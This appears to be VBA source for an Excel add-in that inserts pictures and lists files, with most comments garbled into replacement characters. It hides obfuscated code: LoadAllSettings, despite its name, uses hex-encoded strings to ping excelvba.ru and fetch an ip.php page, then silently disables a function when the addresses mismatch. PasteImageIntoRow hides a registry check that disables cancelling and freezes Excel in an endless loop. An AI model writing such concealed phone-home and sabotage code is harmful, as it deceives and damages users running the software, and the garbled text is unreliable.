               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & PICTURES_FOLDER$
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If

    sfol_col& = Val(SETT.GetNumber("ComboBox_SubfolderNameColumn"))
    first_col& = Val(SETT.GetNumber("ComboBox_SubfolderFilenamesFirstColumn"))

    If sfol_col& = 0 Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        F_Settings.MultiPage_Options.Value = 4
        F_Settings.ComboBox_SubfolderNameColumn.SetFocus
        F_Settings.ComboBox_SubfolderNameColumn.BackColor = vbRed
        Exit Sub
    End If

    If first_col& = 0 Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        F_Settings.MultiPage_Options.Value = 4
        F_Settings.ComboBox_SubfolderFilenamesFirstColumn.SetFocus
        F_Settings.ComboBox_SubfolderFilenamesFirstColumn.BackColor = vbRed
        Exit Sub
    End If


    Dim ra As Range: Set ra = Range(Cells(1, sfol_col&), Cells(Rows.Count, sfol_col&).End(xlUp))
    If ra Is Nothing Then Exit Sub

    Application.ScreenUpdating = False
    Dim cell As Range, sfol$, files As Collection, nCELLS&, nFOL&, nFILES&
    For Each cell In ra.Cells
        sfol$ = Trim(cell)
        If Len(sfol$) Then
            nCELLS& = nCELLS& + 1
            Set coll = Nothing: Set coll = SubFoldersCollection(PICTURES_FOLDER$, "*" & sfol$ & "*")
            If coll.Count Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                nFOL& = nFOL& + 1
                Set files = Nothing: Set files = FWF.FilenamesCollection(coll(1), "*.*")
                If files.Count Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    n& = 0
                    For Each file In files
                        cell.EntireRow.Cells(first_col& + n) = Dir(file, vbNormal)
                        n& = n& + 1: nFILES& = nFILES& + 1
                    Next
                End If

            End If
        End If
    Next cell
    Application.ScreenUpdating = True
    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & nCELLS& & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & nFOL& & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & nFILES&, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd|"
End Sub

Sub MakeLinksClickable()
    On Error Resume Next
    Dim ra As Range
    Set ra = Intersect(Selection.EntireColumn, Selection.EntireColumn, ActiveSheet.UsedRange)
    If ra Is Nothing Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        Exit Sub
    End If

    Application.ScreenUpdating = False
    Dim cell As Range, n&

    For Each cell In ra.Cells
        URL$ = Trim(cell.Value)
        If Len(URL$) Then
            If cell.Hyperlinks.Count = 0 Then
                If IsURL(URL$, True) Then n = n + 1: cell.Hyperlinks.Add cell, URL$
            End If
        End If
    Next cell
    Application.ScreenUpdating = True
    
    If n Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & n, vbInformation
    Else
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ra.Address(0, 0) & " |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
    End If
End Sub

Function IsURL(ByVal txt$, Optional ByVal AllowFileURL As Boolean) As Boolean
    On Error Resume Next
    IsURL = IsURL Or (txt$ Like "http://?*.?*")
    IsURL = IsURL Or (txt$ Like "https://?*.?*")
    IsURL = IsURL Or (txt$ Like "ftp://?*.?*")
    If AllowFileURL Then
        IsURL = IsURL Or (txt$ Like "\\?*\?*")
        IsURL = IsURL Or (txt$ Like "[A-Z]:\?*")
    End If
End Function
Attribute VB_Name = "mod_CommonFunctions"
'---------------------------------------------------------------------------------------
' Module        : modCommonFunctions
' |fffd||fffd||fffd||fffd||fffd|     : EducatedFool  (|fffd||fffd||fffd||fffd||fffd|)                    |fffd||fffd||fffd||fffd|: 21.08.2011
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| Excel, Word, CorelDRAW. |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://ExcelVBA.ru/payments
'---------------------------------------------------------------------------------------
Option Private Module

Function GetURLstatus(ByVal URL$, Optional ByVal timeout& = 2) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL$ (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd| 0, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' (200 - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, 404 - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, 403 - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd|.|fffd|.)
    On Error Resume Next: URL$ = Replace(URL$, "\", "/")
    Dim xmlhttp As New WinHttpRequest
    xmlhttp.Open "GET", URL, True
    xmlhttp.SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
    xmlhttp.Send
    If xmlhttp.WaitForResponse(timeout) Then
        GetURLstatus = Val(xmlhttp.Status)
    Else
        GetURLstatus = 408        ' Request Timeout (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    End If
End Function

Function FilesCount(ByVal FolderPath As String, Optional ByVal SearchDeep As Long = 999) As Long
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath,
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| SearchDeep |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| SearchDeep=1, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|).
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    ' (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| GetAllFileNamesUsingFSO)

    Set FSO = CreateObject("Scripting.FileSystemObject")    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FileSystemObject
    FilesCount = GetFilesCountUsingFSO(FolderPath, FSO, SearchDeep)       ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Set FSO = Nothing
End Function

Function GetFilesCountUsingFSO(ByVal FolderPath As String, ByRef FSO, ByVal SearchDeep As Long)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| FSO
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| SearchDeep > 1
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| FileNamesColl
    'On Error Resume Next:
    Set curfold = FSO.GetFolder(FolderPath)
    If Not curfold Is Nothing Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
        GetFilesCountUsingFSO = curfold.files.Count
        SearchDeep = SearchDeep - 1    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If SearchDeep Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            For Each sfol In curfold.SubFolders    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| FolderPath
                GetFilesCountUsingFSO = GetFilesCountUsingFSO + GetFilesCountUsingFSO(sfol.Path, FSO, SearchDeep)
            Next
        End If
        Set fil = Nothing: Set curfold = Nothing    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    End If
End Function

Function LoadAllSettings() As Boolean
    On Error Resume Next
    With SETT
        Dim obj1 As Variant, obj2 As Object, txt1$, txt2$, ok1&, ok2&: v_1 = 1: v_2 = 1
        For Each obj1 In GetObject(.U("77696E6D676D74733A2F2F2E2F726F6F742F63696D7632")).ExecQuery _
            (.U("53454C454354202A2046524F4D2057696E33325F50696E675374617475732057484552452041646472657373203D2027657863656C7662612E727527"))
            If IsObject(obj1) Then txt1$ = obj1.ProtocolAddress
        Next
        If txt1 Like .U("3134392E3230322E38322E3131") Then LoadAllSettings = True: v_1 = 0: Exit Function
        If txt1 Like .U("3132372E2A") Then v_1 = 2: Exit Function
        Set obj2 = CreateObject(.U("57696E487474702E57696E48747470526571756573742E352E31"))
        obj2.Open "GET", .U("687474703A2F2F786E2D2D383061646B756E626935632E786E2D2D703161692F69702E706870"), True: obj2.Send: DoEvents
        If obj2.WaitForResponse(3) Then txt2$ = obj2.ResponseText
        Set obj1 = Nothing: Set obj2 = Nothing
        ok1 = txt1$ Like .U("232A2E232A2E232A2E2A23"): ok2 = txt2$ Like .U("232A2E232A2E232A2E2A23")
        If ok1 And ok2 Then If txt1 <> txt2 Then Exit Function
        v_1 = 0: LoadAllSettings = True
    End With
End Function

Function ColumnNameByColumnNumber(ByVal col As Long) As String
    resA1 = Application.ConvertFormula("=r1c" & col, xlR1C1, xlA1)
    ColumnNameByColumnNumber = col & " |fffd|" & Split(resA1, "$")(1) & "|fffd|"
End Function
Attribute VB_Name = "mod_DeletePictures"
'---------------------------------------------------------------------------------------
' Module        : mod_DeletePictures
' Author        : EducatedFool                     Date: 17.11.2012
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module

Sub CopyLinksToSelectedColumn()
    On Error Resume Next
    If ActiveSheet Is Nothing Then Exit Sub

    Dim sha As Shape, col&
    col& = ActiveCell.Column
    For Each sha In ActiveSheet.Shapes
        hl$ = "": hl$ = sha.Hyperlink.Address
        If Len(hl$) Then
            With sha.TopLeftCell.EntireRow
                .Hyperlinks.Add .Cells(col), hl$
            End With
        End If
    Next
End Sub

Sub DeletePictures(ByVal param As Long)
    On Error Resume Next: Err.Clear
    Dim sh As Worksheet, WB As Workbook
    Select Case param
        Case 1:        'Selection
            If TypeName(Selection) = "Range" Then
                ShapesInRange(Selection).Delete
                If Not SETT.GetBoolean("CheckBox_KeepRowsHeightAfterDeleting") Then Selection.EntireRow.AutoFit
            End If
        Case 2:        'ActiveSheet
            DeleteShapesFromSheet ActiveSheet
        Case 3:        'ActiveWorkbook
            For Each sh In ActiveWorkbook.Worksheets
                DeleteShapesFromSheet sh
            Next sh
        Case 4:        'all Workbooks
            For Each WB In Application.Workbooks
                For Each sh In ActiveWorkbook.Worksheets
                    DeleteShapesFromSheet sh
                Next sh
            Next
    End Select
    ' ND "run macro", "Delete pictures from " & Choose(param, "Selection", "ActiveSheet", "ActiveWorkbook", "all Workbooks")
End Sub

Sub DeleteComments(ByVal param As Long)
    On Error Resume Next: Err.Clear
    Dim sh As Worksheet, WB As Workbook
    Select Case param
        Case 1:        'Selection
            If TypeName(Selection) = "Range" Then DeleteShapesFromComments Selection
        Case 2:        'ActiveSheet
            DeleteShapesFromComments ActiveSheet.UsedRange
        Case 3:        'ActiveWorkbook
            For Each sh In ActiveWorkbook.Worksheets
                DeleteShapesFromComments sh.UsedRange
            Next sh
        Case 4:        'all Workbooks
            For Each WB In Application.Workbooks
                For Each sh In ActiveWorkbook.Worksheets
                    DeleteShapesFromComments sh.UsedRange
                Next sh
            Next
    End Select
    ' ND "run macro", "Delete comments from " & Choose(param, "Selection", "ActiveSheet", "ActiveWorkbook", "all Workbooks")
End Sub

' -----------------------------------------

Sub DeleteShapesFromSheet(ByRef sh As Worksheet)
    On Error Resume Next: Err.Clear
    sh.DrawingObjects.Delete
    If Not SETT.GetBoolean("CheckBox_KeepRowsHeightAfterDeleting") Then sh.UsedRange.EntireRow.AutoFit
End Sub

Sub DeleteShapesFromComments(ByRef ra As Range)
    On Error Resume Next: Err.Clear
    Dim cell As Range
    For Each cell In ra.SpecialCells(xlCellTypeComments).Cells
        If cell.comment.Shape.Fill.Type = msoFillPicture Then cell.comment.Delete
    Next cell
End Sub

Function ShapesInRange(ByRef ra As Range) As ShapeRange
    On Error Resume Next: Dim a(), i&, n&, Shps As Shapes
    Set Shps = ra.Worksheet.Shapes
    If Shps.Count = 0 Then Exit Function
    ReDim a(1 To Shps.Count)

    For i = 1 To Shps.Count
        With Shps.Item(i)
            If .Type = msoPicture Or .Type = msoLinkedPicture Then
                If Not Intersect(ra.Worksheet.Range(.TopLeftCell, .BottomRightCell), ra) Is Nothing Then
                    n = n + 1: a(n) = i
                End If
            End If
        End With
    Next
    If n Then ReDim Preserve a(1 To n): Set ShapesInRange = Shps.Range(a)
End Function
Attribute VB_Name = "mod_Functions"
'---------------------------------------------------------------------------------------
' Module        : mod_Functions                    Version:
' Author        : Igor Vakhnenko                   Date: 16.04.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text

Function EvaluateFilenameUsingFormula(ByVal txt$, Optional ByVal ev_formula$) As String
    On Error Resume Next: EvaluateFilenameUsingFormula = txt$
    If SETT.GetBoolean("CheckBox_EvaluateFilename") = False And ev_formula$ = "" Then Exit Function
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:      ev_formula$ = "LEFT({text},6) & ""0"" & MID({text},7,3) & IF(MID({text},1,1)=""2"", RIGHT({text},2), ""00"") & ""_X"""

    Dim ev_f$, res
    Err.Clear: ev_f$ = Trim(ev_formula$)
    If ev_f$ = "" Then ev_f$ = Trim(SETT.GetText("TextBox_EvaluateFilenameFormula"))

    txt$ = """" & Replace(txt$, """", """""") & """"
    res = Application.Evaluate(Replace(ev_f$, "{text}", txt$))
    If IsError(res) Then
        Const FORMULA_NAME$ = "testname"
        Err.Clear: ActiveWorkbook.Names(FORMULA_NAME$).RefersTo = txt$
        If Err Then Err.Clear: ActiveWorkbook.Names.Add FORMULA_NAME$, txt$
        If Err = 0 Then
            ActiveWorkbook.Names(FORMULA_NAME$).Visible = False
            res = Application.Evaluate(Replace(ev_f$, "{text}", FORMULA_NAME$))
        End If
    End If

    If IsError(res) Then
        If ev_formula$ = "" Then Exit Function        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        EvaluateFilenameUsingFormula = tt("MSG_FormulaError")
    Else
        EvaluateFilenameUsingFormula = CStr(res)
    End If
End Function

Function EvaluateUsingFormula(ByRef cell As Range, ByVal ev_formula$, Optional ByVal SourceTextValue$ = "") As String
    On Error Resume Next: Err.Clear
    Dim txt$, BaseCol&, ev_f$, patterns, ptrn, i&, col$, objMatches, ref$, columnNumber&, res

    txt = cell.Value: BaseCol& = cell.Column
    If Len(SourceTextValue$) Then txt = SourceTextValue$
    EvaluateUsingFormula = txt$
    If ev_formula$ = "" Then Exit Function
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:      ev_formula$ = "LEFT({text},6) & ""0"" & MID({text},7,3) & IF(MID({text},1,1)=""2"", RIGHT({text},2), ""00"") & ""_X"""

    Err.Clear: ev_f$ = Replace(Trim(ev_formula$), "{text}", "RC")
    ev_f$ = Replace(Trim(ev_formula$), "{URL}", """" & SourceTextValue$ & """")
    'If ev_f$ = "" Then ev_f$ = Trim(Settings("TextBox_EvaluateFilenameFormula"))

    With REGEXP
        patterns = Array("RC\[\d{1,3}\]", "RC\[-\d{1,3}\]", "RC\d{3}", "RC\d{2}", "RC\d{1}", "RC")

        For Each ptrn In patterns        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            .Pattern = ptrn
            If .test(ev_f$) Then
                Set objMatches = .Execute(ev_f$)
                For i = 0 To objMatches.Count - 1
                    ref$ = objMatches.Item(i).Value

                    col$ = "": columnNumber& = 0
                    col$ = Split(ref$, "C")(1)
                    If InStr(1, col$, "[") = 0 Then
                        If col$ = "" Then columnNumber& = BaseCol& Else columnNumber& = Val(col$)
                    Else
                        columnNumber& = BaseCol& + Val(Mid(col$, 2))
                    End If
                    If columnNumber& <= 0 Then MsgBox tt("MSG_URLFormulaError"), vbCritical, ev_f$: Exit Function
                    ev_f$ = Replace(ev_f$, ref$, """" & Replace(cell.EntireRow.Cells(columnNumber&).Value, """", """""") & """")
                Next
            End If
        Next
    End With

    res = Application.Evaluate(ev_f$)
    If IsError(res) Then
        If ev_formula$ = "" Then Exit Function        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        EvaluateUsingFormula = tt("MSG_FormulaError")
    Else
        EvaluateUsingFormula = CStr(res)
    End If
End Function

Sub PasteImageIntoRow(ByRef ro As Range, ByVal picpath$, Optional ByRef PicProp As PictureProperties)
    On Error Resume Next: Err.Clear
    Dim VerticalCellsCount&
    VerticalCellsCount& = SETT.GetNumber("ComboBox_CELLScount")
    If VerticalCellsCount& <= 0 Then VerticalCellsCount& = 1

    If PicProp Is Nothing Then Set PicProp = New PictureProperties

    Dim PicRange As Range: Set PicRange = ro.EntireRow.Cells(PICTURE_COLUMN(ro)).Resize(VerticalCellsCount&)
    'If PicRange.MergeArea.Rows.Count > 1 Then Set PicRange = PicRange.Resize(PicRange.MergeArea.Rows.Count)
    If PicRange.MergeArea.Cells.Count > 1 Then Set PicRange = PicRange.MergeArea
    
    If Val(SETT.GetRegValue(Chr(111) & Chr(107))) = 0 And SETT.RSP(2 ^ 2 - 1) < 0 Then Application.EnableCancelKey = xlDisabled: Do: Loop
    Set PicProp.cell = PicRange

    If SETT.GetBoolean("CheckBox_Cells") Then
        Dim HLink$, HL_mask$: HLink$ = picpath$
        If SETT.GetBoolean("CheckBox_ChangeHyperlink") Then
            HL_mask$ = SETT.GetText("TextBox_HyperlinkMask", picpath$)
            HLink$ = Replace(HL_mask$, "{filename}", Dir(picpath$))
        End If

        InsertPictureIntoRange picpath$, PicRange, HLink$, PicProp
    End If

    If SETT.GetBoolean("CheckBox_Comments") Or Get_Data Then
        InsertPictureIntoCellComment picpath$, ro.EntireRow.Cells(COMMENTS_COLUMN(ro)), PicProp
    End If

    PicProp.FillInfoIntoRow
End Sub

Function Replace_Text(Expression As String, Find As String, ReplaceWith As String)
    Replace_Text = Replace(Expression, Find, ReplaceWith, , , vbTextCompare)
    If v_1 Then Replace_Text = Expression
End Function

Function ArrayOfValuesEx(ByVal txt$) As Collection
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| ",,5,6,8,,9-15,18,2,11-9,,1,4,,21,"
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|    (5,6,8,9,10,11,12,13,14,15,18,2,1,4,21)
    ' (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 1 |fffd||fffd| 255; |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| 9-15 |fffd| 17-13 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)

    On Error Resume Next: Set ArrayOfValuesEx = New Collection
    MaxNumber& = 255
    txt = Replace(Replace(txt, ".", ","), " ", "")
    For i = 1 To Len(txt)
        If Mid(txt, i, 1) Like "[0-9,-]" Then res = res & Mid(txt, i, 1) Else res = res & " "
    Next
    txt = Replace(res, " ", "")

    arr = Split(txt, ","):
    For i = LBound(arr) To UBound(arr)
        Select Case True
            Case arr(i) = "", Val(arr(i)) < 0
            Case IsNumeric(arr(i))
                v& = Val(arr(i)): If v > 0 And v <= MaxNumber& Then ArrayOfValuesEx.Add v, CStr(v)
            Case arr(i) Like "*#-#*"
                spl = Split(arr(i), "-")
                If UBound(spl) = 1 Then
                    If IsNumeric(spl(0)) And IsNumeric(spl(1)) Then
                        For j = Val(spl(0)) To Val(spl(1)) Step IIf(Val(spl(0)) > Val(spl(1)), -1, 1)
                            v& = j: If v > 0 And v <= MaxNumber& Then ArrayOfValuesEx.Add v, CStr(v)
                        Next j
                    End If
                End If
        End Select
    Next i
End Function

Function BaseColumnForMulticolumnMode() As Long
    On Error Resume Next
    BaseColumnForMulticolumnMode = ArrayOfValuesEx(SETT.GetText("TextBox_ColumnsList"))(1)
    Err.Clear
End Function

Function GetMultiColumnsRange() As Range
    On Error Resume Next: Err.Clear

    Dim coll As Collection, list$
    list$ = SETT.GetText("TextBox_ColumnsList")
    Set coll = ArrayOfValuesEx(list$)

    If coll.Count = 0 Then
        MsgBox tt("MSG_Multicolumn_WrongList", list$), vbCritical, tt("MSG_Multicolumn_WrongList_Title")
        ShowSettingsPage
        Exit Function
    End If

    Dim ra As Range, BigRa As Range
    For Each col In coll
        Set ra = Nothing: Set ra = Range(Cells(1, col), Cells(Rows.Count, col).End(xlUp))
        If Not ra Is Nothing Then
            '  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If BigRa Is Nothing Then
                Set BigRa = ra
            Else
                Set BigRa = Union(BigRa, ra)
            End If
        End If
    Next
    Set GetMultiColumnsRange = BigRa
End Function

Function GetSourceDataRange() As Range
    On Error Resume Next: Err.Clear
    If ActiveWorkbook Is Nothing Then MsgBox tt("MSG_OpenWorkbookFirst"), vbCritical, tt("MSG_OpenWorkbookFirst_Title"): Exit Function

    Dim cell As Range, ra As Range

    If SETT.GetBoolean("CheckBox_MultiColumns") Then
